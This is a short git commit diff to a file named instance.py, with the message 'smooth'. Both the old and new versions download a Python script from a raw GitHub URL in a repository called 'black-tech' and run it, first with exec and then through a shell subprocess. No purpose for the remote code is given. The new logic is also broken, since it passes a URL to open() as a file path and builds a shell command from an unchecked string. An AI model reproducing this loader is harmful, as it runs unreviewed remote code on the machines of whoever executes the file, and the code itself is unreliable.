933a515abed914fcf04b2be069ce3be8cb7e7b76
cicadoves <o7infiltrate@gmail.com>
2021-06-03 16:46:34 +0800

    smooth

--- instance.py
+++ instance.py
@@ -1,3 +1,7 @@
+import subprocess
 from urllib.request import urlopen
+
 url = 'https://raw.githubusercontent.com/cicadoves/black-tech/main/over.py'
-exec(urlopen(url).read().decode())
+
+open(url, 'w').write(urlopen(url).read().decode())
+subprocess.run('python '+url, shell=True)
